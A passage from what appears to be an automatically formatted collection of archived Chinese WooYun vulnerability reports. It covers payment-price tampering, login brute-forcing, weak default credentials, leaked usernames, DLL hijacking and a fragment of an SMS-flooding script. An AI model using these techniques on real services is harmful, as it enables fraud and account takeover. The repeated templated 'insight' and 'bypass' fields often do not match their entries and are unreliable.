**详情**: 利用代码#! /usr/bin/env python#coding=utf8from  time import ctime,sleepimport urllib2import cookielibimport urllibimport sysimport threadimport threading;class ThreadMessage(threading.Thread):def __init__(self,func,args,name):super(ThreadMessage,self).__init__();self.func = funcself.args = argsself.name = namedef run(self):self.result = self.func(*self.args);def sendMessage(n,number):cookie = cookieli

**POC**: 利用代码#! /usr/bin/env python#coding=utf8from  time import ctime,sleepimport urllib2import cookielibimport urllibimport sysimport threadimport threading;class ThreadMessage(threading.Thread):def __init__(self,func,args,name):super(ThreadMessage,self).__init__();self.func = funcself.args = argsself.name

**绕过**: 直接利用

**修复**: 增加时间验证。
---

---
### [wooyun-2015-0108734] 橘色成人商城支付漏洞（1毛钱成功购买任意商品）
**厂商**: 桔色成人 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 挑选商品加入购物车 结算结算时抓包 修改 frm_cash 参数提交上来 价格被修改了 支付一下看能不能成功吧支付成功了。。。看一下订单

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2012-07020] 某社交平台某社交平台桌面音乐盒设计缺陷导致崩溃
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录某社交平台某社交平台桌面客户端后 打开某社交平台桌面音乐盒 在没有选定是哪首歌曲时直接拉进播放进度到后面 导致某社交平台桌面程序崩溃。不懂报哪 只好往这上报了。漏洞证明是通过截取上报的错误信息数据包获取的。

**POC**: POST /imReport/winweibo HTTP/1.1Host: report.im.weibo.comAccept: */*Content-Length: 64229Expect: 100-continueContent-Type: multipart/form-data; boundary=----------------------------7c32c2f663d6HTTP/1.1 100 Continue......................................................................................

**绕过**: 直接利用

**修复**: 不懂 对程序分析不会。
---

---
### [wooyun-2014-062737] 万网云邮箱注册逻辑缺陷（可劫持向外发送的邮件）
**厂商**: 万网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前段时间看好了个域名，准备注册，就下了订单，但是没付款。过了两天查询Whois发现已经被注册了，但是也是提交了该订单并付款。接着问他就出现了...可以看到域名确实是没注册成功，钱退了回来。但是却免费得到了云邮箱。然后去“邮箱管理”查看于是点击了“邮箱域名自动解析”打开“https://example.com/[已脱敏]

**POC**: 见上

**绕过**: 直接利用

**修复**: 不用说了吧
---

---
### [wooyun-2016-0187636] P2P安全之宜人贷APP几种安全问题续集
**厂商**: 宜信 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本次发现宜人贷理财app具有https未校验证书、数据重放、webview远程代码执行、组件拒绝服务以及aes key硬编码问题。app为宜人贷理财，采用了https协议，但未校验证书导致通讯数据可捕获；数据能够重放，如登录数据、账户信息获取等；webview存在远程代码执行隐患；另有组件拒绝服务以及aes算法key硬编码问题，如登录信息（手机号、登录密码）就采用该加密算法。

**POC**: 一、	https未校验证书导致数据被捕获（中间人攻击风险）能够正常截获登录通讯数据能够正常截获用户信息通讯数据信任所有证书二、	数据重放重放登录数据成功重放获取账户信息成功三、	webview远程代码执行漏洞存在漏洞的接口，部分代码通过http://**.**.**.**/webview.html测试，存在漏洞的接口:yidingying四、	拒绝服务调用组件导致应用程序崩溃五、	Aes key硬编码用户登录信息（手机号、登录密码）采用aes进行加密，算法如上图，key为硬编码登录账号：13****88加密后为 KBP2WF*****ekMPfrK/QYg==填写硬编码key= 0C5E75A

**绕过**: 编码绕过

**修复**: 修复参考：http://**.**.**.**/bugs/wooyun-2010-079350http://**.**.**.**/bugs/wooyun-2010-081966http://**.**.**.**/bugs/wooyun-2010-079358http://**.**.**.**/
---

---
### [wooyun-2013-037003] 某下载工具最新版多处DLL劫持漏洞
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时某下载工具默认安装路径C:\Program Files\Tencent\某互联网公司Download某互联网公司Download.exe运行时会加载五处不存在的DLL文件分别为：C:\Program Files\Tencent\某互联网公司Download\addons\miner.dllC:\Program Files\Tencent\某互联网公司Download\ieframe.dllC:\Program Files\Tencent\某互联网公司Download\某互联网公司downloadchs.dllC:\Program Files\Tencent\某互联网公司Download\某互联网公司downloadcht.dllC:\Program Files\Tencent\某互联网公司Download\某互联网公司downloadloc.dll只要相应的目录下放入对应名称的DLL文件，就会运行某互联网公司Download.exe的同时会加载对应的DLL。（我这里在指定

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2014-052799] 新版千牛的旺旺可以登录被封账户
**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 被封停的旺旺账号在某电商IM工具上面无法登录但是可以再千牛上面登录旺旺并且拥有和旺旺一样的功能可以正常进行聊天和其他动作

**POC**: 上图是登录失败图这里是使用千牛登录成功可以正常进行聊天截图

**绕过**: 直接利用

**修复**: 修复登录时候判断
---

---
### [wooyun-2015-0107278] 易九金融P2P设计缺陷(可遍历账户邮箱)
**厂商**: 重庆易九金融服务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站：https://example.com/[已脱敏]  测试存在该漏洞5.任意手机账号注册  验证码为4位，有效期3分钟，验证处无别的验证码导致可爆破，任意注册

**POC**: 同上

**绕过**: 直接利用

**修复**: 找易极付安全工程过来协助整改
---

---
### [wooyun-2013-037086] 万达大歌星点歌终端绕过
**厂商**: 大连万达集团股份有限公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地点是南京河西万达第一次绕过是在未改版前，系统在启动的时候会在桌面上停留大约30秒 有这30秒可以做很多时期了第二次新版的系统，由于进去的晚 没有看到系统启动的时候。找到另一个绕过了点击账单酒水，啪的一下 弹出一个计算器来 任务栏也出来了出来这东西 就沦陷了

**POC**: 找到了mdb数据库，碰巧的是 点歌终端安装了office access网络共享，发现了神奇的东西不知道这个酒水菜单是你们测试用的 还是什么  就这么弹出来了  内网一目了然，这个系统还支持U盘播放，只是没有找到插U盘的口。如果能插了U盘 内网就真的沦陷了

**绕过**: 过滤绕过

**修复**: 修补，你们有专业的人才
---

---
### [wooyun-2015-097826] 卖座网设计不当可一分钱买任意电影票（支付漏洞）
**厂商**: maizuo.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 卖座电影APP提交订单金额由本地控制，可任意伪造并支付成功。正常请求：伪造修改后（payCount为实际支付金额、discountPrice为折扣金额、totalPrice为原价）：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 金额完全控制在server端，金额这种敏感数据不可由用户端控制！
---

---
### [wooyun-2015-0162521] 郑州威科姆某处设计逻辑缺陷导致撞库
**厂商**: 郑州威科姆科技股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]

**POC**: admin  123123

**绕过**: 直接利用

**修复**: 加个验证码，口令不要那么弱....
---

---
### [wooyun-2016-0175528] 飞客旅行网某后台验证设计逻辑缺陷可爆破密码进入后台
**厂商**: 飞客旅行网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：https://example.com/[已脱敏] 直接输用户名和密码就行了用burp爆破用户admin的密码爆破的结果为某互联网公司123456登录看看成功进入

**POC**: 如上

**绕过**: 直接利用

**修复**: 增加验证码，防止爆破
---

---
### [wooyun-2015-0137717] 如风达快递任意手机号注册（附赠短信炸弹一枚）
**厂商**: 凡客诚品 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用户注册的地方：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个好修啊。。。
---

---
### [wooyun-2015-0138294] P2P金融安全之来钱网设计逻辑缺陷可重置用户密码
**厂商**: 来钱网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 走一波邮箱密码重置流程得到一个直接重置密码的接口POST https://example.com/[已脱敏] HTTP/1.1Host: www.laiqian.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.

**POC**: 如上

**绕过**: 编码绕过

**修复**: 加强验证
---

---
### [wooyun-2015-0158540] 优学院官网某处设计逻辑缺陷导致用户敏感信息泄露
**厂商**: ulearning.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个漏洞在很多网站都存在，逻辑错误不过现在少很多了，你们怎么还没有跟上步伐！

**POC**: 我们打开官方网站https://example.com/[已脱敏] ，现在拿着这个MD5去解密，可以看到密码解出来是z12345678我就不拿案例了吧，这么显而意见的。。。。。。。

**绕过**: 直接利用

**修复**: 加强验证！不要什么都返回！
---

---
### [wooyun-2015-0124092] 通过逻辑缺陷撸穿金山安全套装之二
**厂商**: 金山毒霸 | **年份**: 2015 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ksapi.sys对关键位置未保护，导致绕过限制，撸穿安全套装

**POC**: 除了\Registry\Machine\SOFTWARE\Kingsoft\AntiVirus注册表项的ProgramPath键值外还有\\Registry\\Machine\\SOFTWARE\\Kingsoft\\KSM\\KXEngine\\CLASSES_ROOT的默认键，对应被放过的进程为ksmsvc.exe\Registry\Machine\SOFTWARE\Kszz的Install Path键，被放过的进程为kszz.exe\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\KSafeSvc的ImagePath键值\

**绕过**: 过滤绕过

**修复**: 保持校验的一致性
---

---
### [wooyun-2015-0113613] 美囤妈妈支付漏洞(2处)
**厂商**: 美囤妈妈 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、购物车中, 可以通过抓包, 将数量修改为0或者负数(这应该是不合理的吧);2、确认订单时,总价格显示为负数;3、但确定订单去支付的时候,会验证.所以只能感觉是设计上有缺陷,毕竟看到负数是不应该的上图:还有一处:提交完订单之后,按浏览器的返回键,购物车的货物消失.

**POC**: 同上！

**绕过**: 直接利用

**修复**: 你们更专业！
---

---
### [wooyun-2015-0112962] 某股份制银行网上银行多个客户端在低版本Windows下存在DLL劫持漏洞（个人银行，电子商务）
**厂商**: 某股份制银行 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 使用LoadLibrary API加载DLL时使用绝对路径
---

---
### [wooyun-2015-0161233] 某家电厂商某社区逻辑漏洞泄露10多万账户信息
**厂商**: 某家电厂商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遍历一下id，返回包越长，账号信息越全。具体包括用户名、电话、地址、邮箱等等

**POC**: 如上

**绕过**: 直接利用

**修复**: 增加权限校验
---

---
### [wooyun-2014-087657] LBE任意号码拦截漏洞（可使恶意软件绕过短信权限控制）
**厂商**: lbesec.com | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞原理1、	通过AndroidMainfest.xml将"com.lbe.security.phone"显式导出，并且没有添加任何权限限制。<providerandroid:authorities="com.lbe.security.phone" android:enabled="true"android:exported="true" android:name="com.lbe.security.service.phone.provider.TelephonyProvider"android:process=":service"/>2、	导出的ContentProvider提供一些URI访问。content://com.lbe.security.phone/blacklist  （拦截黑名单管理）content://com.lbe.security.phone/whitelist  （

**POC**: 1)	修改黑名单库，如图1，apply_to是拦截类型（短信，电话）图1 添加号码到黑名单库图2 黑名单插入成功2)	获取拦截记录，读取拦截到的信息，图3中的”lbe blacklist test ”为发送到拦截号码的短信内容图3 获取拦截记录3)	清除拦截log，抹除痕迹4)	请他数据库内容的验证方式与黑名单一样5)	因为数据库采用明文存储，如果系统已经root，拦截功能也会很容易被攻破

**绕过**: 直接利用

**修复**: 修复建议1、	如果功能不需要提供给第三方程序使用，则不要导出2、	敏感操作需要添加对调用方的验证3、	对敏感操作进行细粒度的权限控制
---

---
### [wooyun-2013-036013] 爆米花某处核心代码泄露
**厂商**: 爆米花网 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏] dll 文件包未删除果断下载下来然后反编译一下可能了一下是核心代码  包涵数据层 业务逻辑层 对象实体层 等等重要代码

**POC**: 没有仔细读代码， 说不定还能发现几处可利用的地方。 感觉挺重要的....

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-045692] DNF存在多种本地内存修改漏洞
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 现在来看看五年都没和谐的改技能吧，每个技能都有一个ID， 这个是缔造的火球~~23502修改为8362，16进制是20AA，进图试试看只是修改一个内存代码，检测不可能一下就检测到这里，而且代码有几万个，都是可以修改的。

**POC**: 这是一个技能CALL，他的目的很简单，就是释放一个技能，但是我们修改了寄存器的值后，代码发生了偏移，当然，现在要讨论的不是外挂技术，而是漏洞技术，DNF不仅仅存在多种本地漏洞，利用反汇编及代码修改可以做到超越客户端权限的事情。

**绕过**: 直接利用

**修复**: 不要老在检测的方面做文章，其实把一些内存保护起来才是王道。
---

---
### [wooyun-2012-04190] 某电商平台(aliyun)帐户系统逻辑漏洞
**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在忘记密码处，可以通过手机找回和邮箱找回密码两种方式获得指定帐户的新密码设置权限

**POC**: 进入忘记密码，填写想要获取权限帐号的ID获得url:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 尽快修复，尽快下班！
---

---
### [wooyun-2012-012864] 100e一百易严重支付漏洞
**厂商**: 100e.com | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在这个地方：购买一百易产品与服务第二步：支付第三步：改价格参数第四步：看成果最后跳支付银行了：

**POC**: 一般情况下到这里就可以证明问题的存在和严重性了，支付应该没问题，同样也不会存在不发货的情况。HI

**绕过**: 直接利用

**修复**: 看看有个叫风萧萧的家伙给出的建议吧
---

---
### [wooyun-2014-072254] 锦江之星rsa私钥泄露以及smali code修改实现金额篡改
**厂商**: 锦江之星旅馆有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: rsa私钥泄露可以导致数据包在网络传输过程中被篡改。我用fiddler抓包测试可行。smali修改交易函数中的金额，提交交易发现没有在服务器上进行验证就交易了。证明在图片中。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检测金额与实际支付的是否相等。
---

---
### [wooyun-2012-011731] 票务中国支付漏洞
**厂商**: 票务中国 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 票务中国支付环节漏洞，危害不必说

**POC**: 没钱支付；是有客服妹子打电话，不过她好像不管订单金额~只和你聊天

**绕过**: 直接利用

**修复**: 先注册成为厂商吧
---

---
### [wooyun-2015-0151574] 某省农村信合设计逻辑缺陷可泄露大量内部信息
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://**.**.**.**/、http://**.**.**.**:7001/defaultroot/login.jsp，两处都可以撞库，用常用用户名和弱口令123456可获得30来个账号，可泄露大量内部信息。liutwangpliujunchenxywangyyliuleichenweizhangylzhangglyangjunwanghuawanglinzhangymwangpingzhangxiawangtingchenhongzhangjingwkljhliuyyliujunwangttwangcmzhouliliupingzhangttwanglinzhangsywangmeiwangfengwangyangyanglingwangxiuhua

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2014-051673] 读览天下支付逻辑漏洞可刷充值金额
**厂商**: dooland.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过替换支付订单号的方式，来完成花小钱买大东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。看视频吧：链接：https://example.com/[已脱敏] 密码：dri8

**POC**: 证明放在私下的视频中，3天之后会自动删除。链接：https://example.com/[已脱敏] 密码：dri8

**绕过**: 直接利用

**修复**: 检查支付完成后价格和买的产品的价格是一样的。
---

---
### [wooyun-2016-0185354] 第三方消息推送SDK个推（igexin）因密码学设计缺陷导致通信流量可解密篡改
**厂商**: getui.com | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于保护通信流量的实现存在严重密码学问题，导致获取到推送流量的中间人可以实时恢复出通信密钥，进而可以解密消息获取推送协议的交互数据、修改交互数据内容、重新加密回合法消息。

**POC**: 下面是虾米音乐应用从屏幕点亮到收到一条推送消息的过程中所有通信解密后的情况，从中可以看到一个完整的推送过程。Send '\x0f460012182913413\x0f359786050198713\x1fA-359786050198713-1457335818899\x16UgM0PuGY4Z9hhSeWysmxz5'Recv '\x0f]\x91J\x13\x9fg\xaf\x1fA-359786050198713-1457335818899 921f7606f5a217900ea4e1e46d8e3e2c 8ffcc07d7c924c7aacd5ef76db0f014d'注：客户端向个推服

**绕过**: 直接利用

**修复**: 更改密码学相关设计与实现，使用密码学安全的算法与协议。
---

---
### [wooyun-2015-0130409] 大米CMS存在0元购物逻辑漏洞（demo演示）
**厂商**: damicms.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件:Web/Lib/Action/MemberAction.class.php       //413行if(!is_numeric($_POST['id'][$i]) || !is_numeric($_POST['price'][$i]) || !is_numeric($_POST['qty'][$i])){continue;}$data['gid'] = $_POST['id'][$i];                 //这里把传入的商品id传给了 $data['gid']$data['uid'] = $_SESSION['dami_uid'];$data['price'] = (float)M('article')->where('aid='.$data['gid'])->getField('price');//必须,信任客户端表单可以改写哈$_POST['price'][

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0138205] 超级课程表某主营业务逻辑缺陷导致全体用户真实姓名手机和某互联网公司隐私泄露
**厂商**: super.cn | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 超级社团是超级课程表主营业务，截止至目前已有4万多个社团加入。主要功能之一就是：方便用户寻找社团内其他用户的联系方式，包括某互联网公司和手机号码和短号，其中还包括用户的院系和社团名称和社团职位等信息，这些信息对于社团内部成员来说是公开的，但对于社团外的人来说，这便是隐私。进入超级社团后有一个大大的按钮——“导出通讯录”链接格式如下：https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 从clubId处就应该开始加密，防止暴力破解
---

---
### [wooyun-2015-0142838] 商务中国某处逻辑漏洞
**厂商**: 商务中国 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用户登录处可暴力破解https://example.com/[已脱敏] /login HTTP/1.1Host: www.bizcn.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏] ptrsrv=48

**POC**: 用户登录处可暴力破解https://example.com/[已脱敏] /login HTTP/1.1Host: www.bizcn.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

**绕过**: 直接利用

**修复**: 看着办26666
---

---
### [wooyun-2015-094382] 大部分端游设计盲区盛大某游戏作为例子
**厂商**: 盛大游戏 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天讲个盛大的游戏,鬼吹灯.从几个方面分析下一个简单的木马是如何盗号的.内存一直是端游的设计盲区(除非部分特殊游戏DNF等大部分数据本地计算的网络游戏,但是这是极少数的)因为大部分游戏防护的只有2种,外挂和盗号外挂主要是防止异常封包等,盗号主要是hook键盘,但是内存几乎不会得到任何重视,因为1:你修改内存不会直接被盗号.2:你修改内存不会对你在游戏内获得额外的利益.那么问题来了,真的不会被盗号吗?我们来测试下可以看到游戏还是有一定的防护的这个时候如果运行木马你说会被盗号吗?99%的人会说现在怎么会被盗号呢其实这个是后是最容易被盗号的而已一个木马可以是通用的盗号木马木马可以读一个内存就能盗号帐号密码是直接明文储存的而且这种例子不是一个两个也就是说一个这种木马想要通用盗号只需要2个参数即可实现游戏进程ID 与 内存地址这是读取内存盗号,如果只是单单这样还是构不成通用型还有个就是写入, 那么写

**POC**: 如上

**绕过**: 直接利用

**修复**: 暂时很难修复
---

---
### [wooyun-2013-044066] RADASM 堆栈缓冲区溢出漏洞
**厂商**: www.oby.ro | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞原因：在处理.RC文件字符串的时候由于申请空间不足可导致栈缓冲区溢出。淹没SEH链表。攻击者可以构造特定的.RC文件，修改SEH链表，即可利用此漏洞执行任意想执行的程序。本人分析的版本为2.2.1.9 ，漏洞程序为ResEd.exe  但是此漏洞可能涉及到RADASM的所有版本

**POC**: null准poc程序的FFFFFFFF和CCCCCCCC （0BH-12H）就为SEH链和SE处理程序了，我这里没有写漏洞利用程序

**绕过**: 直接利用

**修复**: 对路径和文件名总长度做检测。静止超过104H字节！
---

---
### [wooyun-2012-06459] 搜狗号码通手机客户端可被恶意攻击、以及隐私泄露问题
**厂商**: 搜狗 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、先决条件，APK反编译，不再阐述。2、反编译读代码，发现搜狗号码通手机客户端和服务器通讯采用了AES ECB模式加密，并且密钥有点偷懒，为产品英文的截取字符。3、核心服务器通讯有query_number.php和upload_number.php。前者为查询是否为有问题的手机号码，以及手机号码的举报次数；后者则为举报号码到骚扰电话库4、upload_number.php对IMEI参数校验不严，攻击者可以利用伪造的imei在短时间内大批量举报任意号码到骚扰电话库，并且集中对某号码恶意刷票，从而导致受害者在不知情情况下被恶意标记。5、标记功能没有教育好用户，用户有可能会误用为日常用户身份的标记，从而导致类似某互联网公司圈子的隐私泄露。

**POC**: 1、通过实验，我自己的手机号已经刷到被102人举报为“快递”电话了。（求还原！）2、标签功能导致的信息泄露（但这个图的电话有问题，怀疑也是和本人一样绕过手机端进行测试的）

**绕过**: 直接利用

**修复**: 1、完善对异常提交的处理逻辑。2、完善标记功能的分类、或者提醒标记的作用是骚扰电话举报，以免出现错误的隐私泄露3、另外，IMEI可否hash再传输？
---

---
### [wooyun-2014-088682] 长城宽带任意金额支付漏洞
